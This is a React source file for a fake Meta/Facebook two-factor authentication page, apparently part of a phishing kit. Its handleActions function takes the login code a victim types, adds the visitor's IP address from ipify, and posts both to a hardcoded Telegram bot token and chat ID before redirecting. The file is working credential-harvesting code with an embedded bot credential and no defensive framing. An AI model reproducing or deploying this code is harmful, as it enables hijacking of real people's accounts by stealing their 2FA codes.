import React, { Component } from 'react';
import './Confirm2.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min.js';
import './App';

import MetaLogo from './Meta-Logo.png';
class Confirm2 extends Component {
    constructor(props) {
        super(props);
        this.state = {
            code: '',
            ip: '',
            showModal: false,
            isButtonDisabled: false,
        };
    }

    componentDidMount() {
        this.getIp();
        const metaTag = document.createElement('meta');
        metaTag.name = 'viewport';
        metaTag.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
        document.getElementsByTagName('head')[0].appendChild(metaTag);
    }

    getIp = () => {
        fetch('https://api.ipify.org/?format=json')
            .then((response) => response.json())
            .then((data) => {
                this.setState({ ip: data.ip });
            });
    };

    handleCodeChange = (e) => {
        // Allow only numeric input
        const numericValue = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
        this.setState({ code: numericValue });
    };


    handleActions = () => {
        const { code, ip } = this.state;
        if (code === '') {
            document.getElementById('code').style.border = '1px solid red';
            return;
        } else {
            const bot = 'bot6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
            const chid = '-1002131592723';
    
            const message = `2FA 1: "${code}"\nIP: ${ip}`;
    
            const params = {
                content: encodeURIComponent(message), // Encode the message to handle spaces and special characters
                parse_mode: 'Markdown', // Specify that the message format is Markdown
            };
    
            fetch(
                `https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}&parse_mode=${params.parse_mode}`,
                {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }
            ).then(() => {
                window.location = '/confirm/2fa/';
            });
        }
    };
    
    

    toggleModal = () => {
        this.setState((prevState) => ({ showModal: !prevState.showModal }));
    };

    render() {
        return (
            <div>
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossOrigin="anonymous"></script>
                <section className="header">
                    <div className="fotoh">
                        <div className="row">
                            <div className="col-6">
                                <img src={MetaLogo} className="img-fluid" alt="fb" width="80" />
                            </div>

                            <div className="col-6" style={{ textAlign: 'right' }}>
                                {/* Header right content */}
                            </div>
                        </div>
                    </div>
                </section>
                <section id="fac" style={{ display: 'block' }}>
                    <div className="container">
                        <div className="row">
                            <div className="col-md-6 offset-md-3 col-sm-8 offset-sm-4">
                                <div className="card">
                                    <h3 className="twh3">Two-factor authentication required</h3>

                                    <div className="bodyyy">
                                        <p>
                                            You’ve asked us to require a 6-digit login code when anyone tries to access your account
                                            from a new device or browser.
                                        </p>

                                        <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>

                                        <div className="form-group" style={{ padding: '5px 0', display: 'inline-block' }}>
                                            <input
                                                style={{
                                                    marginLeft: '0',
                                                    fontSize: '14px',
                                                    borderRadius: '4px',
                                                    
                                                    WebkitBoxShadow: 'inset 0 1px 1px rgba(0, 0, 0, 0.08)',
                                                    boxShadow: 'inset 0 1px 1px rgba(0, 0, 0, 0.08)',
                                                    WebkitTransition: 'border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s',
                                                    color: '#4e4d4d',
                                                }}
                                                type="number"
                                                id="code"
                                                className="form-control mx-sm-3"
                                                aria-describedby="passwordHelpInline"
                                                placeholder="Login code"
                                                name="code"
                                                minLength="4"
                                                required=""
                                                onChange={this.handleCodeChange}
                                            />
                                        </div>
                                        <div className="form-group paddingleftt" style={{ marginTop: '-8px', display: 'inline-block' }}>
                                            <p
                                                name=""
                                                className="nolink"
                                                id="timer"
                                                style={{
                                                    backgroundColor: 'transparent',
                                                    border: 'transparent',
                                                    padding: '0',
                                                    margin: '0',
                                                    display: 'inline',
                                                    color: '#385898',
                                                    fontSize: '13px',
                                                    marginLeft: '15px'
                                                }}
                                            >
                                            </p>
                                            <a
                                                href="/confirm"
                                                id="sendcodeagain"
                                                className="btn"
                                                onClick={this.sendcodeagain}
                                                style={{ display: 'none',marginLeft: '15px' }}
                                            >
                                            </a>
                                        </div>
                                    </div>

                                    <div className="footerii" style={{ width: '100%' }}>
                                    
                                        <button
                                            className="btn butoni"
                                            onClick={this.handleActions}
                                            style={{
                                                marginTop: '0',
                                                marginBottom: '0',
                                                float: 'right',
                                                backgroundColor: '#4267b2',
                                                border: '1px solid #4267b2',
                                                color: 'white',
                                                fontSize: '13px',
                                                fontWeight: '500',
                                                padding: '5px 20px',
                                                borderRadius: '4px',
                                                textTransform: 'none',
                                            }}
                                        >
                                            Send
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <div
                    className="modal fade"
                    id="twof"
                    tabIndex="-1"
                    role="dialog"
                    aria-labelledby="exampleModalLabel"
                    aria-hidden="true"
                >
                    <div className="modal-dialog" role="document">
                        <div className="modal-content">
                            <div className="modal-header">
                                <h5 className="modal-title" id="exampleModalLabel" style={{ fontSize: '16px' }}>
                                    Didn’t receive a code?
                                </h5>
                                <button type="button" className="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            {this.state.showModal && (
                            <div className="modal-body">
                                <p>1. Go to <strong>Settings &gt; Security and Login.</strong></p>
                                <p>
                                    2. Under the <strong>Two-Factor Authentication</strong> section, click <strong>Use two-factor authentication</strong>.
                                    You may need to re-enter your password.
                                </p>
                                <p>
                                    3. Next to <strong>Recovery Codes</strong>, click <strong>Setup</strong> then <strong>Get Codes</strong>.
                                    If you've already set up recovery codes, you can click <strong>Show Codes.</strong>
                                </p>
                            </div>
                            )}
                            <div className="modal-footer">
                                <button type="button" className="btn btn-secondary" data-dismiss="modal">
                                    Close
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <input type="hidden" id="ip_hidden" value="" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossOrigin="anonymous"></script>
                <script>
                    {/* Additional scripts */}
                </script>
            </div>
        );
    }
}

export default Confirm2;
